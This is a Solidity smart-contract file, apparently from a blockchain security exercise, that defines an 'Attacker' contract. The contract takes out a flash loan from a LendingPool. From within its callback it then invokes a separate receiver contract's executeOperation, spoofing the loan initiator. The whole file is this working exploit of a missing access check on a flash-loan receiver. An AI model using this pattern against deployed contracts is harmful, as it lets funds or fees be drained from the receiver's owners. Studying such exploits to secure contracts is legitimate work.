// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./LendingPool.sol";
import "./SimpleReceiver.sol";

contract Attacker is IFlashLoanReceiver{
    LendingPool public pool;
    SimpleReceiver public simpleReceiver;

    constructor(address _pool, address _simpleReceiver) {
        pool = LendingPool(_pool);
        simpleReceiver = SimpleReceiver(_simpleReceiver);
    }

    function attack(uint256 amount) public {
        pool.flashLoan(amount, address(this), "0x0");
    }

    function executeOperation(
        uint256 amounts,
        address receiverAddress,
        address _initiator,
        bytes calldata data
    ) external {
        simpleReceiver.executeOperation(amounts, receiverAddress, _initiator, data);
    }
}